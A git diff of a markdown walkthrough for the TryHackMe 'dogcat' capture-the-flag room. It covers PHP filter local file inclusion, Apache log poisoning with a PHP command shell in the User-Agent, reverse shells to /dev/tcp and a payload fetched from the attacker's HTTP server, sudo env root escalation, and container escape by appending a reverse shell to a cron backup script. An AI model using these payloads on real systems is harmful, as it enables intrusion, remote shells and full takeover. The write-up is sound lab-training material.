@@ -3,6 +3,8 @@ title: "dogcat"
 subtitle: "CTF room: https://tryhackme.com/room/dogcat"
 category: CTF, Medium
 tags: ctf,nmap,gobuster,dirbuster,session,broken-authentication,javascript,apache,ubuntu,john,gpg2john,linpeas,privesc,cron
+panel_includes:
+  - toc
 ---
 # dogcat
 
@@ -12,7 +14,7 @@ URL: [https://tryhackme.com/room/dogcat](https://tryhackme.com/room/dogcat) [Med
 
 Description of the room:
 
-> I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats! 
+> I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!
 
 ## PHASE 2: Scanning & Enumeration
 
@@ -86,11 +88,11 @@ This is interesting because whenever the application is relying on US to provide
 
 #### Local File Inclusion (LFI)
 
-Right off the bat, that "view" of "dog", could mean that "dog" is a folder name. If that's the case, then I wonder if we could point to different directories. If we can "inject" PHP code, we can try to see if we can view the contents of the files used for this site. Example:
+Right off the bat, that "view" of "dog", could mean that "dog" is a folder or file name. If that's the case, then I wonder if we could point to different directories or files? If we can "inject" PHP code, we can try to see if we can view the contents of the files used for this site using the PHP "read" filter. Example:
 
 > `/?view=php://filter/read=convert.base64-encode/resource=./dog/../index`
 
-We include `dog` because there seems to be a check for the word "dog" or "cat", and then we can guess that there is an "default document" of index.php, index.html, etc. Doing this, outputs the contents of the index file, base64-encoded. So, you can quickly base64-decode it:
+We include `dog` because there seems to be a check for the word "dog" or "cat", and then we can guess that there is an "default document" of index.php, index.html, etc. Doing this, outputs the contents of the index file, base64-encoded. So, you can quickly base64-decode it using any one of:
 
 1. Base64decode.org - [https://www.base64decode.org/](https://www.base64decode.org/)
 2. CyberChef - [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
@@ -136,13 +138,13 @@ That decodes to a readable PHP files. This shows us how this main page works:
 </html>
 ```
 
-Some of the key takaways from that PHP code:
+Some of the key takeaways from that PHP code:
 
 1. If there is no `ext` query string argument, it will append a `.php` to the file name.
 2. If the `view` query string argument does not include "dog" or "cat", it will give you an error.
 3. If the `view` query string argument DOES include "dog" or "cat", it is going to output the contents of the "filename" specified in `view` and concatenate the file extension (either the default `.php`, or whatever you specify in the `ext` query string parameter)
 
-Knowing this, it looks like we can use Local File Inclusion to read files. We just have to include "dog" or "cat" in the path, and we likely need to specify an empty string for the file extension `ext` query string argument.
+Knowing this, it looks like we can use **Local File Inclusion (LFI)** to read files. We just have to include "dog" or "cat" in the path, and we likely need to specify an empty string for the file extension `ext` query string argument.
 
 A common test would be to go to a known file, which also happens to have interesting information: `/etc/passwd`. We can try several of these to see if this app is susceptible to LFI with attempts like:
 
@@ -181,7 +183,7 @@ But it's quite common to include the `User-Agent` in the log too, typically at t
 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
 ```
 
-We can verify if Apache is configured to include the `User-Agent` by viewing the access log:
+We can verify if Apache is configured to include the `User-Agent` by viewing the access log, using our new-found LFI capabilities:
 
 ```text
 /?view=./dog/../../../../var/log/apache2/access.log&ext
@@ -193,11 +195,11 @@ And yes, we can confirm that the `User-Agent` is being written to the log. For e
 10.6.90.119 - - [27/Sep/2023:11:12:49 +0000] "GET /dogs/8.jpg HTTP/1.1" 200 52967 "http://10.10.251.122/?view=dog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
 ```
 
-**Putting this all together**, that means that we should be able to set our `User-Agent` to some PHP code, and we could have this PHP page execute our code, and then put the results in this log file, where we are currently seeing the `User-Agent`
+**Putting this all together**, that means that we should be able to set our `User-Agent` to some PHP code. If there is not any "input validation", then we could have this PHP page execute our PHP code, and then put the results in this log file, where we are currently seeing the `User-Agent`
 
 ## PHASE 3: Gaining Access & Exploitation
 
-It seems we might have an entry point. We can view files on the server, and we have this potential for Log Injection where we could potentially run arbitrary PHP code - AKA Remote Code Execution (RCE).
+It seems we might have an entry point. We can view files on the server, and we have this potential for **Log Injection** where we could potentially run arbitrary PHP code - AKA **Remote Code Execution (RCE)**.
 
 ### Option 1: Executing query string `cmd`, as our `User-Agent`
 
@@ -206,15 +208,15 @@ This kill chain consists of:
 1. Set the `User-Agent` to be: `<?php system($_GET['cmd']);?>` (or `exec` or `shell_exec`, etc.)
 2. Set a query string argument like: `cmd=ls`
 
-The idea here is that you can URL-encode a command or series of commands in the `cmd` query string paramter, and it will be executed when the Apache server goes to get the `User-Agent` of the caller, incidentally runs our code, and then injects the output (if any) as the `User-Agent` field in the `/var/log/apache2/access.log`
+The idea here is that you can URL-encode a command or series of commands in the `cmd` query string parameter, and it will be executed when the Apache server goes to get the `User-Agent` of the caller, incidentally runs our code, and then injects the output (if any) as the `User-Agent` field in the `/var/log/apache2/access.log`
 
-Between special characters (e.g. `'"()$>|`, etc) and then URL-encoding the command (which you can easily do via [CyberChef](https://gchq.github.io/CyberChef/)), something wasn't quite working. I had a difficult type executing complex commands such as echoing out a PHP reverse shell into a file. For example this one-liner reverse shell:
+Between special characters (e.g. `'"()$>|`, etc) and then URL-encoding the command (which you can easily do via [CyberChef](https://gchq.github.io/CyberChef/)), something wasn't quite working. I had a difficult time executing complex commands such as echoing out a PHP reverse shell into a file. For example this one-liner reverse shell:
 
 ```php
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?>
 ```
 
-Would need to be written to a file on the server (revshell.php), and so we need to "escape" the double-quotes, and we now also have a greater-than sign, which is a special character in HTML also:
+Would need to be written to a file on the server (`revshell.php`), and so we need to "escape" the double-quotes, and we now also have a greater-than sign, which is a special character in HTML also:
 
 ```bash
 echo "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'\"); ?>" > revshell.php
@@ -226,7 +228,7 @@ So finally, we URL-encode all of that and hope is decodes correctly on the other
 echo%20%22%3C?php%20exec(%5C%22/bin/bash%20-c%20'bash%20-i%20%3E%20/dev/tcp/10.0.0.10/1234%200%3E&1'%5C%22);%20?%3E%22%20%3E%20revshell.php
 ```
 
-Meaning that this URL-encoded string above is what would be passed in the `cmd` querystring, making the full URL something like:
+Meaning that this URL-encoded string above is what would be passed in the `cmd` query string, making the full URL something like:
 
 ```text
 /?view=./dog/../../../../var/log/apache2/access.log&ext&cmd=echo%20%22%3C?php%20exec(%5C%22/bin/bash%20-c%20'bash%20-i%20%3E%20/dev/tcp/10.0.0.10/1234%200%3E&1'%5C%22);%20?%3E%22%20%3E%20revshell.php
@@ -234,7 +236,7 @@ Meaning that this URL-encoded string above is what would be passed in the `cmd` 
 
 Hopefully you are using some kind of editor (like VSCode) to stage these things, as this can get really messy and confusing to try to construct this live on the command-line. Then, you accidentally hit up-arrow and you lose it all!
 
-Alas, I didn't have much luck with this approach.
+Alas, I didn't have much luck with this approach. The answer is probably to escape more of the special characters, but I decided to just move on to another technique.
 
 #### Option 2: Directly downloading a reverse shell, as our `User-Agent`
 
@@ -242,21 +244,136 @@ The kill chain on this one is a little more straight-forward. Basically:
 
 1. Run `nc -lvnp 9000` to listen for the reverse shell. Set up your reverse shell file to connect on port 9000.
 2. Run `python3 -m http.server 8000` from a folder where you have your reverse shell file.
-3. On our web request, set the `User-Agent` to be something like: `<?php file_put_contents('revshell.php', file_get_contents('http://10.6.90.119:8000/revshell.php'));?>`
+3. On our web request, modify the `User-Agent` to be something like:
+
+    ```php
+    GET /?view=./dog/../../../../var/log/apache2/access.log&ext HTTP/1.1
+    Host: 10.10.67.160
+    User-Agent: "<?php file_put_contents('revshell.php', file_get_contents('http://10.6.90.119:8000/revshell.php'));?>"
+    ```
+
 4. Navigate to `/revshell.php` on the web server and you should get a connection over in netcat.
 
 > **TIP:** This [pentestmonkey Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) is great. Just set your IP address and listening port, and you can re-use this over and over.
 {: .prompt-tip }
 
-
-
 ### Unprivileged Access
 
-TBD
+Using Option 2, above, I was able to get a reverse shell as `www-data`. There are several things "weird" about this connection:
+
+1. I can't "upgrade" the shell with Python `pty` or `script`, neither Python nor script are installed. See: [Cheatsheet](/cheatsheet/#concept-upgrading-a-fragile-shell) for more details.
+2. Running `hostname` shows the host name as `b2deba11a79a` as opposed to a word-based server name (e.g. `server1`, `dogcat`, etc.
+3. It doesn't look like SSH is installed, but `nmap` DID show it as installed?!
+
+What is going on here? Spoiler: **We are running in a container.** More on this in a minute, let's see if we can capture some flags. We run something like this to find any files with the word "flag" in it, and `2>/devnull` means send an errors (`STDERR`) to `/dev/null` (don't show them on the screen):
+
+```bash
+find / -name *flag* 2>/dev/null
+```
+
+#### Flag 1 of 4
+
+Is located here: `cat /var/www/html/flag.php`
+
+#### Flag 2 of 4
+
+Is located here: `cat /var/www/flag2_QMW7JvaY2LvK.txt`
 
 ### Privilege Escalation / Privileged Access
 
-TBD
+If we run: `sudo -l` we can see we can run `/usr/bin/env`:
+
+```text
+User www-data may run the following commands on b2deba11a79a:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+The `env` command is used to locate programs based on the `PATH` environment variable. This means we can run basically any command. So, we do this:
+
+```bash
+sudo -l /usr/bin/env bash
+```
+
+And we now have a primitive `root` prompt. Again, since even basic tools are not installed, we can't easily "upgrade" this shell. It's messy but it works.
+
+#### Flag 3 of 4
+
+Is located here: `cat /root/flag3.txt`
+
+#### Flag 4 of 4
+
+We're logged in as `root` in this primitive shell, but we still can't seem to do much, because we're running from within a container.
+
+From snooping around, we find that there is a backup process in `/opt/backups` that appears to work with a folder that is shared between this container and the host (e.g. `/root/container`):
+
+```bash
+total 2892
+drwxr-xr-x 2 root root    4096 Apr  8  2020 .
+drwxr-xr-x 1 root root    4096 Sep 29 07:49 ..
+-rwxr--r-- 1 root root     111 Sep 29 08:20 backup.sh
+-rw-r--r-- 1 root root 2949120 Sep 29 08:20 backup.tar
+
+```
+
+Inside of that `backup.sh` we have:
+
+```bash
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+```
+
+We can also tell from the timestamp that this seems to run regularly. So, we might append a reverse shell command to connect back to a *NEW* Netcat instance that is running on port `9001` (remember that our current connection is already using port `9000`):
+
+```bash
+echo "bash -i >& /dev/tcp/10.6.90.119/9001 0>&1" >> backup.sh
+```
+
+> **TIP:** Remember that `>` creates or overwrites the file. `>>` create or appends to the end of the file.
+{: .prompt-tip}
+
+That appends a new line onto that backup script, which now looks like this:
+
+```bash
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+bash -i >& /dev/tcp/10.6.90.119/9001 0>&1
+```
+
+![A few moments later](afewmomentslater.png)
+
+We get a Netcat connection, and it's from the Docker host:
+
+```bash
+listening on [any] 9001 ...
+connect to [10.6.90.119] from (UNKNOWN) [10.10.67.160] 36038
+bash: cannot set terminal process group (3169): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dogcat:~# 
+```
+
+From here, the 4th and final flag is: `cat /root/flag4.txt`.
+
+What's kind of Inception-like is that we can look at the container that we were just in (are STILL in) with something like `docker ps`:
+
+```text
+CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                    PORTS                NAMES
+b2deba11a79a        box                 "docker-php-entrypoi…"   38 minutes ago      Up 38 minutes (healthy)   0.0.0.0:80->80/tcp   stoic_ptolemy
+root@dogcat:~#
+```
+
+We can also quickly check to see if there is anything else exposed from this host with: `netstat -tupln` and it looks like it's just SSH and the web server:
+
+```text
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      704/systemd-resolve 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      878/sshd            
+tcp        0      0 127.0.0.1:36449         0.0.0.0:*               LISTEN      828/containerd      
+tcp6       0      0 :::22                   :::*                    LISTEN      878/sshd            
+tcp6       0      0 :::80                   :::*                    LISTEN      1291/docker-proxy   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           704/systemd-resolve 
+udp        0      0 10.10.67.160:68         0.0.0.0:*                           689/systemd-network
+```
 
 ## PHASE 4: Maintaining Access & Persistence
 
@@ -348,4 +465,4 @@ cat /dev/null | tee /root/.bash_history /home/kathy/.bash_history /home/sam/.bas
 
 ## Summary
 
-Completed: [<kbd>CTRL</kbd>+<kbd>SHFT</kbd>+<kbd>I</kbd> (requires `jsynowiec.vscode-insertdatestring` VS Code Extension)]
+Completed: [2023-09-29 05:13:24]
